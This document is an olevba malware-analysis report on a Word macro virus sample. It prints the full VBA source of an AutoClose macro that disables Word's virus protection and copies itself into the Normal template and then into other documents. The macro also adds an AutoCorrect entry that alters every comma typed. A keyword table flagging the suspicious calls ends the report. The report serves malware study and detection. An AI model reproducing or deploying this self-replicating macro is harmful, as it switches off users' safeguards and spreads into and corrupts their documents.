olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Btw-d452f60efd44739e5c8887f393737fbbc106ef2d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Btw-d452f60efd44739e5c8887f393737fbbc106ef2d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoR.bas 
in file: Virus.MSWord.Btw-d452f60efd44739e5c8887f393737fbbc106ef2d - OLE stream: 'Macros/VBA/AutoR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Ěŕęđîń ńîçäŕí "
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.AutoR.AutoClose"
'Autor
'Íîđěŕëüíűé âčđóńîę...  Áĺçîáčäíűé ŕáńîëţňíî
'Ďđč ďîěîůč ĺăî âű ńěîćĺňĺ áűńňđĺĺ îńâîčňü Word :-)))

  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Autor", wdOrganizerObjectProjectItems
  
  If NormalTemplate.Saved = False Then NormalTemplate.Save

    myValue = ", ęńňŕňč,"
    Ol = True
    For Each anEntry In AutoCorrect.Entries
        If anEntry.Name = myValue Then Ol = False
    Next anEntry
    If Ol Then NormalTemplate.Application.AutoCorrect.Entries.Add Name:=",", Value:=myValue
    
    s = ""
    NormalTemplate.VBProject.VBComponents("AutoR").Export ("c:\Repeat.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\Repeat.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\Repeat.tmp")

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
